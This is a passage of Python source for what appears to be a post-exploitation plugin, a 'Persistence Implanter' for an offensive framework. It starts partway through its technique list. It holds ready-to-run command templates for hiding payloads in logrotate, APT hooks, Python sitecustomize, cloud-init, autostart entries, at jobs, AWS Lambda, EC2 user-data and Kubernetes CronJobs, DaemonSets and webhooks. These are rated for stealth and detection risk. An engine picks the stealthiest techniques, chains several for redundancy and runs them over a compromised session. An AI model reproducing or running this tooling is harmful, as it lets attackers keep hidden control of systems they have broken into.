            cleanup_command='rm -f /etc/udev/rules.d/{name}.rules && udevadm control --reload-rules',
            mitre_id='T1546.017',
            fileless=True,
        ),
        
        PersistenceTechnique(
            name='logrotate Hook',
            description='Add payload to logrotate postrotate',
            category='logrotate',
            platform='linux',
            stealth_level=4,
            detection_risk='medium',
            success_rate=80,
            requires_admin=True,
            command_template='echo "/var/log/syslog {{\n    daily\n    postrotate\n        {cmd}\n    endscript\n}}" > /etc/logrotate.d/{name}',
            cleanup_command='rm -f /etc/logrotate.d/{name}',
            mitre_id='T1053.003',
            fileless=True,
        ),
        
        PersistenceTechnique(
            name='APT Hook',
            description='Add APT hook to execute on package operations',
            category='apt',
            platform='linux',
            stealth_level=4,
            detection_risk='medium',
            success_rate=80,
            requires_admin=True,
            command_template='echo "DPkg::Post-Invoke {{\\"{cmd}\\";}};" > /etc/apt/apt.conf.d/{name}',
            cleanup_command='rm -f /etc/apt/apt.conf.d/{name}',
            mitre_id='T1546.004',
            fileless=True,
        ),
        
        PersistenceTechnique(
            name='Python sitecustomize',
            description='Add payload to Python sitecustomize.py',
            category='python',
            platform='linux',
            stealth_level=4,
            detection_risk='low',
            success_rate=80,
            requires_admin=True,
            command_template='echo "import os; os.system(\'{cmd}\')" > /usr/lib/python3/dist-packages/sitecustomize.py',
            cleanup_command='rm -f /usr/lib/python3/dist-packages/sitecustomize.py',
            mitre_id='T1546.004',
            fileless=True,
        ),
        
        PersistenceTechnique(
            name='Cloud-init',
            description='Add payload to cloud-init config',
            category='cloud_init',
            platform='linux',
            stealth_level=4,
            detection_risk='low',
            success_rate=85,
            requires_admin=True,
            command_template='echo "#cloud-config\nruncmd:\n  - {cmd}" > /etc/cloud/cloud.cfg.d/{name}.cfg',
            cleanup_command='rm -f /etc/cloud/cloud.cfg.d/{name}.cfg',
            mitre_id='T1053.003',
            fileless=True,
        ),
        
        PersistenceTechnique(
            name='XDG Autostart',
            description='Add .desktop file to XDG autostart',
            category='xdg',
            platform='linux',
            stealth_level=3,
            detection_risk='medium',
            success_rate=85,
            requires_admin=False,
            command_template='mkdir -p ~/.config/autostart && echo "[Desktop Entry]\nType=Application\nName={name}\nExec={cmd}" > ~/.config/autostart/{name}.desktop',
            cleanup_command='rm -f ~/.config/autostart/{name}.desktop',
            mitre_id='T1547.013',
        ),
        
        PersistenceTechnique(
            name='At Job',
            description='Schedule payload with at command',
            category='at',
            platform='linux',
            stealth_level=2,
            detection_risk='medium',
            success_rate=75,
            requires_admin=False,
            command_template='echo "{cmd}" | at now + 5 minutes',
            cleanup_command='atq | awk \'{print $1}\' | xargs atrm',
            mitre_id='T1053.003',
        ),
    ]
    
    @classmethod
    def get_all_techniques(cls) -> List[PersistenceTechnique]:
        return cls.TECHNIQUES
    
    @classmethod
    def get_techniques_by_category(cls, category: str) -> List[PersistenceTechnique]:
        return [t for t in cls.TECHNIQUES if t.category == category]
    
    @classmethod
    def get_techniques_by_stealth(cls, min_stealth: int) -> List[PersistenceTechnique]:
        return [t for t in cls.TECHNIQUES if t.stealth_level >= min_stealth]


# ── Cloud Persistence Techniques ───────────────────────────────────────────

class CloudPersistenceDatabase:
    """Database of cloud persistence techniques."""
    
    TECHNIQUES = [
        PersistenceTechnique(
            name='AWS Lambda Trigger',
            description='Create Lambda function with trigger',
            category='cloud',
            platform='cloud',
            stealth_level=4,
            detection_risk='medium',
            success_rate=85,
            requires_admin=True,
            command_template='aws lambda create-function --function-name {name} --runtime python3.9 --role {role} --handler lambda_function.lambda_handler --zip-file fileb://{payload}',
            cleanup_command='aws lambda delete-function --function-name {name}',
            mitre_id='T1546',
        ),
        
        PersistenceTechnique(
            name='K8s CronJob',
            description='Create Kubernetes CronJob',
            category='container',
            platform='container',
            stealth_level=4,
            detection_risk='medium',
            success_rate=90,
            requires_admin=True,
            command_template='kubectl apply -f - <<EOF\napiVersion: batch/v1\nkind: CronJob\nmetadata:\n  name: {name}\nspec:\n  schedule: "*/5 * * * *"\n  jobTemplate:\n    spec:\n      template:\n        spec:\n          containers:\n          - name: {name}\n            image: {image}\n            command: ["{cmd}"]\n          restartPolicy: OnFailure\nEOF',
            cleanup_command='kubectl delete cronjob {name}',
            mitre_id='T1053.003',
        ),
        
        PersistenceTechnique(
            name='K8s DaemonSet',
            description='Create Kubernetes DaemonSet (runs on every node)',
            category='container',
            platform='container',
            stealth_level=5,
            detection_risk='high',
            success_rate=90,
            requires_admin=True,
            command_template='kubectl apply -f - <<EOF\napiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: {name}\nspec:\n  selector:\n    matchLabels:\n      name: {name}\n  template:\n    metadata:\n      labels:\n        name: {name}\n    spec:\n      containers:\n      - name: {name}\n        image: {image}\n        command: ["{cmd}"]\nEOF',
            cleanup_command='kubectl delete daemonset {name}',
            mitre_id='T1543.002',
        ),
        
        PersistenceTechnique(
            name='K8s MutatingWebhook',
            description='Create Kubernetes MutatingWebhook',
            category='container',
            platform='container',
            stealth_level=5,
            detection_risk='critical',
            success_rate=80,
            requires_admin=True,
            command_template='kubectl apply -f - <<EOF\napiVersion: admissionregistration.k8s.io/v1\nkind: MutatingWebhookConfiguration\nmetadata:\n  name: {name}\nwebhooks:\n- name: {name}.example.com\n  clientConfig:\n    service:\n      name: {service}\n      namespace: {namespace}\n      path: "/mutate"\n  rules:\n  - operations: ["CREATE"]\n    apiGroups: [""]\n    apiVersions: ["v1"]\n    resources: ["pods"]\nEOF',
            cleanup_command='kubectl delete mutatingwebhookconfiguration {name}',
            mitre_id='T1546',
        ),
        
        PersistenceTechnique(
            name='EC2 User-Data',
            description='Modify EC2 instance user-data',
            category='cloud',
            platform='cloud',
            stealth_level=4,
            detection_risk='medium',
            success_rate=85,
            requires_admin=True,
            command_template='aws ec2 modify-instance-attribute --instance-id {instance_id} --attribute userData --value "{b64_cmd}"',
            cleanup_command='aws ec2 modify-instance-attribute --instance-id {instance_id} --attribute userData --value ""',
            mitre_id='T1053.003',
        ),
    ]
    
    @classmethod
    def get_all_techniques(cls) -> List[PersistenceTechnique]:
        return cls.TECHNIQUES


# ── Persistence Chain Database ─────────────────────────────────────────────

class PersistenceChainDatabase:
    """Database of multi-layer persistence chains."""
    
    CHAINS = [
        PersistenceChain(
            name='Maximum Redundancy (Windows)',
            description='5-layer persistence for maximum survival',
            techniques=['Registry Run Key (HKLM)', 'Scheduled Task (SYSTEM)', 'Windows Service', 'WMI Event Subscription', 'Winlogon Userinit'],
            redundancy_level=5,
            survival_probability=95,
            detection_risk='high',
        ),
        
        PersistenceChain(
            name='Stealth Chain (Windows)',
            description='Low-detection persistence chain',
            techniques=['COM Hijacking', 'Time Provider', 'Print Processor', 'PowerShell Profile'],
            redundancy_level=4,
            survival_probability=80,
            detection_risk='low',
        ),
        
        PersistenceChain(
            name='Maximum Redundancy (Linux)',
            description='5-layer persistence for maximum survival',
            techniques=['Systemd Service', 'System Crontab', 'Root SSH Keys', 'PAM Module', 'RC.Local'],
            redundancy_level=5,
            survival_probability=95,
            detection_risk='high',
        ),
        
        PersistenceChain(
            name='Stealth Chain (Linux)',
            description='Low-detection persistence chain',
            techniques=['User Systemd Service', 'Profile.d Directory', 'XDG Autostart', 'Python sitecustomize'],
            redundancy_level=4,
            survival_probability=80,
            detection_risk='low',
        ),
        
        PersistenceChain(
            name='Cloud Native Chain',
            description='Cloud-native persistence',
            techniques=['K8s CronJob', 'K8s DaemonSet', 'AWS Lambda Trigger'],
            redundancy_level=3,
            survival_probability=85,
            detection_risk='medium',
        ),
    ]
    
    @classmethod
    def get_all_chains(cls) -> List[PersistenceChain]:
        return cls.CHAINS


# ── Auto-Selection Engine ──────────────────────────────────────────────────

class AutoSelectionEngine:
    """Automatically selects best persistence technique."""
    
    @staticmethod
    def select_technique(exec_func, session, platform: str, stealth_level: int = 3,
                         requires_admin: bool = True) -> Optional[PersistenceTechnique]:
        """Select best technique based on environment."""
        
        if platform == 'windows':
            techniques = WindowsPersistenceDatabase.get_all_techniques()
        elif platform == 'linux':
            techniques = LinuxPersistenceDatabase.get_all_techniques()
        elif platform == 'cloud':
            techniques = CloudPersistenceDatabase.get_all_techniques()
        else:
            return None
        
        # Filter by requirements
        filtered = [t for t in techniques if t.stealth_level >= stealth_level]
        
        if requires_admin:
            filtered = [t for t in filtered if t.requires_admin]
        else:
            filtered = [t for t in filtered if not t.requires_admin]
        
        if not filtered:
            # Fallback to any technique
            filtered = techniques
        
        # Sort by success rate
        filtered.sort(key=lambda t: t.success_rate, reverse=True)
        
        return filtered[0] if filtered else None
    
    @staticmethod
    def select_chain(platform: str, stealth_level: int = 3) -> Optional[PersistenceChain]:
        """Select best persistence chain."""
        chains = PersistenceChainDatabase.get_all_chains()
        
        # Filter by platform
        if platform == 'windows':
            chains = [c for c in chains if 'Windows' in c.name]
        elif platform == 'linux':
            chains = [c for c in chains if 'Linux' in c.name]
        elif platform == 'cloud':
            chains = [c for c in chains if 'Cloud' in c.name]
        
        # Sort by redundancy level
        chains.sort(key=lambda c: c.redundancy_level, reverse=True)
        
        return chains[0] if chains else None


# ── Implantation Engine ────────────────────────────────────────────────────

class ImplantationEngine:
    """Handles persistence implantation."""
    
    @staticmethod
    def implant(exec_func, session, technique: PersistenceTechnique, name: str,
                cmd: str, stealth_config: StealthConfig = None) -> ImplantResult:
        """Execute persistence implantation."""
        start_time = time.time()
        
        # Build command
        implant_cmd = technique.command_template.format(
            name=name,
            cmd=cmd,
            clsid='{' + ''.join(random.choices('0123456789ABCDEF', k=8)) + '-' +
                  ''.join(random.choices('0123456789ABCDEF', k=4)) + '-' +
                  ''.join(random.choices('0123456789ABCDEF', k=4)) + '-' +
                  ''.join(random.choices('0123456789ABCDEF', k=4)) + '-' +
                  ''.join(random.choices('0123456789ABCDEF', k=12)) + '}',
            dll=cmd,
            target_exe='notepad.exe',
            shortcut='C:\\Users\\Public\\Desktop\\shortcut.lnk',
            ssh_key='ssh-rsa AAAA...',
            module='payload.ko',
            image='alpine:latest',
            role='arn:aws:iam::123456789012:role/lambda-role',
            payload='payload.zip',
            instance_id='i-1234567890abcdef0',
            b64_cmd='payload',
            service='webhook-service',
            namespace='default',
        )
        
        # Execute
        out = exec_func(session, implant_cmd)
        duration_ms = int((time.time() - start_time) * 1000)
        
        # Check success
        success = True
        error = ""
        
        if out and ('denied' in out.lower() or 'error' in out.lower() or 'failed' in out.lower()):
            success = False
            error = out[:200]
        
        # Build cleanup command
        cleanup_cmd = technique.cleanup_command.format(
            name=name,
            cmd=cmd,
        )
        
        return ImplantResult(
            technique=technique.name,
            name=name,
            success=success,
            platform=technique.platform,
            duration_ms=duration_ms,
            output=out[:500] if out else '',
            error=error,
            cleanup_command=cleanup_cmd,
            stealth_level=technique.stealth_level,
        )
    
    @staticmethod
    def implant_chain(exec_func, session, chain: PersistenceChain, name: str,
                      cmd: str, platform: str) -> List[ImplantResult]:
        """Execute multi-layer persistence chain."""
        results = []
        
        if platform == 'windows':
            techniques = WindowsPersistenceDatabase.get_all_techniques()
        elif platform == 'linux':
            techniques = LinuxPersistenceDatabase.get_all_techniques()
        else:
            techniques = CloudPersistenceDatabase.get_all_techniques()
        
        for technique_name in chain.techniques:
            technique = next((t for t in techniques if t.name == technique_name), None)
            if technique:
                result = ImplantationEngine.implant(exec_func, session, technique, name, cmd)
                results.append(result)
        
        return results


# ── Main Plugin ─────────────────────────────────────────────────────────────

class PersistenceImplanter(NexPlugin):
    name        = "persistence-implanter"
    description = "Advanced persistence engine — 60+ techniques, cloud/container, stealth modes, auto-chain"
    author      = "vulnquest58"
    version     = "3.0"
    platform    = "all"
    category    = "persistence"
    mitre_id    = "T1547.001"
    
    def run(self, session, args: list):
        # Parse args
        implant_type = None
        implant_name = "NexPersistence"
        implant_cmd = None
        stealth_level = 3
        multi_layer = False
        auto_mode = False
        list_mode = False
        cleanup_mode = False
        chain_name = None
        
        for a in (args or []):
            if a.startswith('--implant='):
                implant_type = a.split('=', 1)[1].lower()
            elif a.startswith('--name='):
                implant_name = a.split('=', 1)[1]
            elif a.startswith('--cmd='):
                implant_cmd = a.split('=', 1)[1]
            elif a.startswith('--stealth='):
                stealth_level = int(a.split('=', 1)[1])
            elif a == '--multi-layer':
                multi_layer = True
            elif a == '--auto':
                auto_mode = True
            elif a == '--list':
                list_mode = True
            elif a == '--cleanup':
                cleanup_mode = True
            elif a.startswith('--chain='):
                chain_name = a.split('=', 1)[1]
        
        self.info(f"🔒 Starting Persistence Implanter v3.0 (stealth={stealth_level})")
        
        start_time = time.time()
        sections = []
        
        sections.append("\n" + "━"*64)
        sections.append("  [🔒 Persistence Implanter v3.0 — Advanced Persistence Engine]")
        sections.append("━"*64)
        
        # ── Step 1: Platform Detection ────────────────────────────────────
        platform = self._detect_platform(session)
        sections.append(f"  Platform: {platform.upper()}")
        sections.append(f"  Stealth Level: {stealth_level}/5")
        
        # ── Step 2: List Techniques ───────────────────────────────────────
        if list_mode:
            sections.append("\n[*] Phase 1: Available Persistence Techniques")
            sections.append("─"*64)
            
            if platform == 'windows':
                techniques = WindowsPersistenceDatabase.get_all_techniques()
            elif platform == 'linux':
                techniques = LinuxPersistenceDatabase.get_all_techniques()
            else:
                techniques = CloudPersistenceDatabase.get_all_techniques()
            
            sections.append(f"  [+] {len(techniques)} techniques available:")
            
            for technique in techniques[:20]:
                stealth_icon = '🟢' if technique.stealth_level >= 4 else '🟡' if technique.stealth_level >= 3 else '🟠'
                sections.append(f"    {stealth_icon} {technique.name}")
                sections.append(f"        Stealth: {technique.stealth_level}/5 | Success: {technique.success_rate}%")
                sections.append(f"        Admin Required: {'YES' if technique.requires_admin else 'NO'}")
            
            # Show chains
            sections.append("\n  [+] Persistence Chains:")
            chains = PersistenceChainDatabase.get_all_chains()
            for chain in chains:
                sections.append(f"    • {chain.name}")
                sections.append(f"        Redundancy: {chain.redundancy_level}/5 | Survival: {chain.survival_probability}%")
            
            return '\n'.join(sections)
        
        # ── Step 3: Auto-Selection ────────────────────────────────────────
        if auto_mode:
            sections.append("\n[*] Phase 1: Auto-Selection")
            sections.append("─"*64)
            
            technique = AutoSelectionEngine.select_technique(
                self._exec, session, platform, stealth_level
            )
            
            if technique:
                sections.append(f"  ✅ Selected: {technique.name}")
                sections.append(f"      Stealth: {technique.stealth_level}/5")
                sections.append(f"      Success Rate: {technique.success_rate}%")
                
                if implant_cmd:
                    result = ImplantationEngine.implant(
                        self._exec, session, technique, implant_name, implant_cmd
                    )
                    
                    if result.success:
                        sections.append(f"  ✅ Implantation successful ({result.duration_ms}ms)")
                        sections.append(f"      Cleanup: {result.cleanup_command[:100]}")
                    else:
                        sections.append(f"  ❌ Implantation failed: {result.error}")
            else:
                sections.append("  ❌ No suitable technique found")
        
        # ── Step 4: Manual Implantation ───────────────────────────────────
        elif implant_type and implant_cmd:
            sections.append(f"\n[*] Phase 1: Manual Implantation")
            sections.append("─"*64)
            sections.append(f"  Technique: {implant_type}")
            sections.append(f"  Name: {implant_name}")
            sections.append(f"  Command: {implant_cmd[:100]}")
            
            # Find technique
            if platform == 'windows':
                techniques = WindowsPersistenceDatabase.get_all_techniques()
            else:
                techniques = LinuxPersistenceDatabase.get_all_techniques()
            
            technique = next((t for t in techniques if implant_type in t.name.lower()), None)
            
            if technique:
                result = ImplantationEngine.implant(
                    self._exec, session, technique, implant_name, implant_cmd
                )
                
                if result.success:
                    sections.append(f"  ✅ Implantation successful ({result.duration_ms}ms)")
                    sections.append(f"      Stealth Level: {result.stealth_level}/5")
                    sections.append(f"      Cleanup: {result.cleanup_command[:100]}")
                else:
                    sections.append(f"  ❌ Implantation failed: {result.error}")
            else:
                sections.append(f"  ❌ Technique not found: {implant_type}")
        
        # ── Step 5: Multi-Layer Persistence ───────────────────────────────
        if multi_layer or chain_name:
            sections.append("\n[*] Phase 2: Multi-Layer Persistence")
            sections.append("─"*64)
            
            if chain_name:
                chains = PersistenceChainDatabase.get_all_chains()
                chain = next((c for c in chains if chain_name.lower() in c.name.lower()), None)
            else:
                chain = AutoSelectionEngine.select_chain(platform, stealth_level)
            
            if chain and implant_cmd:
                sections.append(f"  Chain: {chain.name}")
                sections.append(f"  Redundancy: {chain.redundancy_level}/5")
                sections.append(f"  Survival Probability: {chain.survival_probability}%")
                
                results = ImplantationEngine.implant_chain(
                    self._exec, session, chain, implant_name, implant_cmd, platform
                )
                
                successful = [r for r in results if r.success]
                sections.append(f"\n  Results: {len(successful)}/{len(results)} successful")
                
                for result in results:
                    icon = '✅' if result.success else '❌'
                    sections.append(f"    {icon} {result.technique}")
            else:
                sections.append("  ❌ No suitable chain found")
        
        # ── Step 6: Summary ───────────────────────────────────────────────
        duration = round(time.time() - start_time, 2)
        
        sections.append("\n" + "━"*64)
        sections.append("  [📊 Persistence Summary]")
        sections.append("━"*64)
        sections.append(f"  Platform: {platform.upper()}")
        sections.append(f"  Stealth Level: {stealth_level}/5")
        sections.append(f"  Duration: {duration}s")
        
        # ── Step 7: Save to Loot ──────────────────────────────────────────
        self.loot(
            {
                "type": "persistence_session",
                "platform": platform,
                "stealth_level": stealth_level,
                "duration": duration,
            },
            category='persistence',
            source='persistence-implanter',
            confidence='high'
        )
        
        self.emit(
            'timeline.event',
            title=f"Persistence Implanter Complete — Platform: {platform}",
            type='persistence',
            plugin=self.name
        )
        
        self.info(f"🔒 Persistence Implanter complete — Platform: {platform}")
        
        return '\n'.join(sections)
    
    def _detect_platform(self, session) -> str:
        for attr in ('OS', 'os', 'platform'):
            val = getattr(session, attr, None)
            if val and isinstance(val, str):
                if 'windows' in val.lower():
                    return 'windows'
                if 'linux' in val.lower():
                    return 'linux'
        try:
            out = self._exec(session, 'echo %OS%') or ''
            if 'Windows' in out:
                return 'windows'
        except Exception:
            pass
        return 'linux'
    
    @staticmethod
    def _exec(session, cmd: str) -> str:
        for method in ('exec', 'run', 'execute', 'send_command'):
            fn = getattr(session, method, None)
            if callable(fn):
                result = fn(cmd)
                if isinstance(result, bytes):
                    return result.decode(errors='replace')
                if isinstance(result, str):
                    return result
        return ''